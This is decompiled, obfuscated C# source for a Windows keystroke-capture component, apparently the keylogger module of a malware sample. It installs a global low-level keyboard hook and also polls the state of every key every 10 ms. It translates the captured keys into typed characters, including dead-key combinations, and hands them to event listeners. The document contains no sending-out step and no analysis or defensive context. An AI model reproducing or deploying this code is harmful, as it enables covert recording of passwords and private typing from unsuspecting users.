using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal class Class1 : Component
{
	public delegate void Delegate0(string value, bool isChar);

	public delegate void Delegate1(int vkcode);

	private abstract class Class2 : IDisposable
	{
		public static Class1 class1_0;

		public abstract void Dispose();
	}

	private class Class3 : Class2
	{
		public delegate void Delegate2(string x);

		private delegate IntPtr Delegate3(int nCode, IntPtr wParam, ref Struct0 lParam);

		private struct Struct0
		{
			public int int_0;

			public int int_1;

			public int int_2;

			private int int_3;

			private int int_4;
		}

		private const int int_0 = 13;

		private const int int_1 = 256;

		private const int int_2 = 260;

		private const int int_3 = 257;

		private const int int_4 = 261;

		private static Delegate3 delegate3_0 = smethod_1;

		private static IntPtr intptr_0 = IntPtr.Zero;

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetWindowsHookEx(int int_5, Delegate3 delegate3_1, IntPtr intptr_1, uint uint_0);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool UnhookWindowsHookEx(IntPtr intptr_1);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CallNextHookEx(IntPtr intptr_1, int int_5, IntPtr intptr_2, ref Struct0 struct0_0);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr GetModuleHandle(string string_0);

		public Class3(Class1 _klg)
		{
			intptr_0 = smethod_0(delegate3_0);
			Class2.class1_0 = _klg;
		}

		public override void Dispose()
		{
			vmethod_0(bool_0: true);
			GC.SuppressFinalize(this);
		}

		protected virtual void vmethod_0(bool bool_0)
		{
			UnhookWindowsHookEx(intptr_0);
		}

		~Class3()
		{
			vmethod_0(bool_0: false);
		}

		[DllImport("kernel32.dll")]
		public static extern int GetCurrentThreadId();

		private static IntPtr smethod_0(Delegate3 delegate3_1)
		{
			using Process process = Process.GetCurrentProcess();
			using ProcessModule processModule = process.MainModule;
			return SetWindowsHookEx(13, delegate3_1, GetModuleHandle(processModule.ModuleName), 0u);
		}

		private static IntPtr smethod_1(int int_5, IntPtr intptr_1, ref Struct0 struct0_0)
		{
			if (int_5 >= 0)
			{
				if (!(intptr_1 == (IntPtr)256) && !(intptr_1 == (IntPtr)260))
				{
					if (intptr_1 == (IntPtr)257 || intptr_1 == (IntPtr)261)
					{
						Class2.class1_0.method_7(struct0_0.int_0, struct0_0.int_1, bool_2: false);
					}
				}
				else
				{
					Class2.class1_0.method_7(struct0_0.int_0, struct0_0.int_1, bool_2: true);
				}
			}
			return CallNextHookEx(intptr_0, int_5, intptr_1, ref struct0_0);
		}
	}

	private class Class4 : Class2
	{
		private Timer timer_0;

		private bool[] bool_0 = new bool[256];

		private int int_0 = 32768;

		[DllImport("User32.dll")]
		private static extern short GetAsyncKeyState(int int_1);

		[DllImport("user32.dll")]
		private static extern uint MapVirtualKeyEx(uint uint_0, uint uint_1, IntPtr intptr_0);

		[DllImport("user32.dll")]
		private static extern IntPtr GetKeyboardLayout(uint uint_0);

		[DllImport("user32.dll")]
		private static extern short GetKeyState(int int_1);

		public Class4(Class1 _klg)
		{
			//IL_0044: Unknown result type (might be due to invalid IL or missing references)
			//IL_004e: Expected O, but got Unknown
			for (int i = 0; i < bool_0.Length; i++)
			{
				bool_0[i] = false;
			}
			Class2.class1_0 = _klg;
			timer_0 = new Timer();
			timer_0.set_Interval(10);
			timer_0.add_Tick((EventHandler)timer_0_Tick);
			timer_0.set_Enabled(true);
		}

		private void timer_0_Tick(object sender, EventArgs e)
		{
			for (int i = 8; i < 256; i++)
			{
				bool flag;
				if ((flag = GetAsyncKeyState(i) == -32767) || (bool_0[i] && !Convert.ToBoolean(GetKeyState(i) & int_0)))
				{
					IntPtr keyboardLayout = GetKeyboardLayout(0u);
					uint int_ = MapVirtualKeyEx((uint)i, 0u, keyboardLayout);
					Class2.class1_0.method_7(i, (int)int_, flag);
					bool_0[i] = flag;
				}
			}
		}

		public override void Dispose()
		{
			vmethod_0(bool_1: true);
			GC.SuppressFinalize(this);
		}

		protected virtual void vmethod_0(bool bool_1)
		{
			((Component)(object)timer_0).Dispose();
		}

		~Class4()
		{
			vmethod_0(bool_1: false);
		}
	}

	private const int int_0 = 256;

	private const int int_1 = 260;

	private const int int_2 = 257;

	private const int int_3 = 261;

	private Class2 class2_0;

	private Delegate0 delegate0_0;

	private Delegate0 delegate0_1;

	private static Delegate1 delegate1_0;

	private Delegate1 delegate1_1;

	private bool bool_0;

	private bool bool_1;

	private ArrayList arrayList_0 = new ArrayList();

	public event Delegate0 Event_0
	{
		add
		{
			Delegate0 @delegate = delegate0_0;
			Delegate0 delegate2;
			do
			{
				delegate2 = @delegate;
				Delegate0 value2 = (Delegate0)Delegate.Combine(delegate2, value);
				@delegate = Interlocked.CompareExchange(ref delegate0_0, value2, delegate2);
			}
			while ((object)@delegate != delegate2);
		}
		remove
		{
			Delegate0 @delegate = delegate0_0;
			Delegate0 delegate2;
			do
			{
				delegate2 = @delegate;
				Delegate0 value2 = (Delegate0)Delegate.Remove(delegate2, value);
				@delegate = Interlocked.CompareExchange(ref delegate0_0, value2, delegate2);
			}
			while ((object)@delegate != delegate2);
		}
	}

	public event Delegate0 Event_1
	{
		add
		{
			Delegate0 @delegate = delegate0_1;
			Delegate0 delegate2;
			do
			{
				delegate2 = @delegate;
				Delegate0 value2 = (Delegate0)Delegate.Combine(delegate2, value);
				@delegate = Interlocked.CompareExchange(ref delegate0_1, value2, delegate2);
			}
			while ((object)@delegate != delegate2);
		}
		remove
		{
			Delegate0 @delegate = delegate0_1;
			Delegate0 delegate2;
			do
			{
				delegate2 = @delegate;
				Delegate0 value2 = (Delegate0)Delegate.Remove(delegate2, value);
				@delegate = Interlocked.CompareExchange(ref delegate0_1, value2, delegate2);
			}
			while ((object)@delegate != delegate2);
		}
	}

	public static event Delegate1 Event_2
	{
		add
		{
			Delegate1 @delegate = delegate1_0;
			Delegate1 delegate2;
			do
			{
				delegate2 = @delegate;
				Delegate1 value2 = (Delegate1)Delegate.Combine(delegate2, value);
				@delegate = Interlocked.CompareExchange(ref delegate1_0, value2, delegate2);
			}
			while ((object)@delegate != delegate2);
		}
		remove
		{
			Delegate1 @delegate = delegate1_0;
			Delegate1 delegate2;
			do
			{
				delegate2 = @delegate;
				Delegate1 value2 = (Delegate1)Delegate.Remove(delegate2, value);
				@delegate = Interlocked.CompareExchange(ref delegate1_0, value2, delegate2);
			}
			while ((object)@delegate != delegate2);
		}
	}

	public event Delegate1 Event_3
	{
		add
		{
			Delegate1 @delegate = delegate1_1;
			Delegate1 delegate2;
			do
			{
				delegate2 = @delegate;
				Delegate1 value2 = (Delegate1)Delegate.Combine(delegate2, value);
				@delegate = Interlocked.CompareExchange(ref delegate1_1, value2, delegate2);
			}
			while ((object)@delegate != delegate2);
		}
		remove
		{
			Delegate1 @delegate = delegate1_1;
			Delegate1 delegate2;
			do
			{
				delegate2 = @delegate;
				Delegate1 value2 = (Delegate1)Delegate.Remove(delegate2, value);
				@delegate = Interlocked.CompareExchange(ref delegate1_1, value2, delegate2);
			}
			while ((object)@delegate != delegate2);
		}
	}

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uint_0, uint uint_1);

	[DllImport("user32.dll")]
	private static extern IntPtr GetKeyboardLayout(uint uint_0);

	[DllImport("user32.dll")]
	private static extern int ToAscii(uint uint_0, uint uint_1, byte[] byte_0, [Out] StringBuilder stringBuilder_0, uint uint_2);

	public void method_0()
	{
		class2_0 = new Class4(this);
	}

	private static bool smethod_0(uint uint_0)
	{
		return (MapVirtualKey(uint_0, 2u) & 0x80000000u) != 0;
	}

	private bool method_1(uint uint_0)
	{
		return uint_0 >= 32;
	}

	private bool method_2(string string_0)
	{
		return string_0.ToString().Length == 1;
	}

	private bool method_3()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Invalid comparison between Unknown and I4
		return (int)Control.get_ModifierKeys() == 131072;
	}

	[DllImport("user32.dll")]
	private static extern short GetKeyState(int int_4);

	private byte[] method_4()
	{
		byte[] array = new byte[256];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)GetKeyState(i);
		}
		return array;
	}

	private void method_5(uint uint_0, uint uint_1, bool bool_2, byte[] byte_0)
	{
		string text = ((object)(Keys)uint_0).ToString();
		if (method_1(uint_0) && !method_3())
		{
			StringBuilder stringBuilder = new StringBuilder(2);
			uint num = (uint)ToAscii(uint_0, uint_1, byte_0, stringBuilder, 0u);
			bool_1 = false;
			if (num != 0)
			{
				text = stringBuilder.ToString().Substring(0, 1);
			}
		}
		if (bool_2)
		{
			delegate0_0(text, method_2(text));
		}
		else
		{
			delegate0_1(text, method_2(text));
		}
	}

	private void method_6(uint uint_0, uint uint_1, bool bool_2)
	{
		if (smethod_0(uint_0))
		{
			bool_0 = true;
			byte[] array = new byte[256];
			array = method_4();
			arrayList_0.Add(new object[4] { uint_0, uint_1, bool_2, array });
			return;
		}
		if (bool_0)
		{
			byte[] array2 = new byte[256];
			array2 = method_4();
			bool_1 = true;
			bool_0 = false;
			arrayList_0.Add(new object[4] { uint_0, uint_1, bool_2, array2 });
			return;
		}
		if (bool_1)
		{
			foreach (object item in arrayList_0)
			{
				object[] array3 = (object[])item;
				method_5((uint)array3[0], (uint)array3[1], (bool)array3[2], (byte[])array3[3]);
				if (smethod_0((uint)array3[0]))
				{
					ToAscii(uint_0, uint_1, (byte[])array3[3], new StringBuilder(2), 0u);
				}
			}
			arrayList_0.Clear();
		}
		byte[] array4 = new byte[256];
		array4 = method_4();
		method_5(uint_0, uint_1, bool_2, array4);
	}

	private void method_7(int int_4, int int_5, bool bool_2)
	{
		if (delegate0_0 != null && bool_2)
		{
			method_6((uint)int_4, (uint)int_5, bool_2: true);
		}
		else if (delegate0_1 != null && !bool_2)
		{
			method_6((uint)int_4, (uint)int_5, bool_2: false);
		}
		if (delegate1_0 != null && bool_2)
		{
			delegate1_0(int_4);
		}
		else if (delegate1_1 != null && !bool_2)
		{
			delegate1_1(int_4);
		}
	}
}
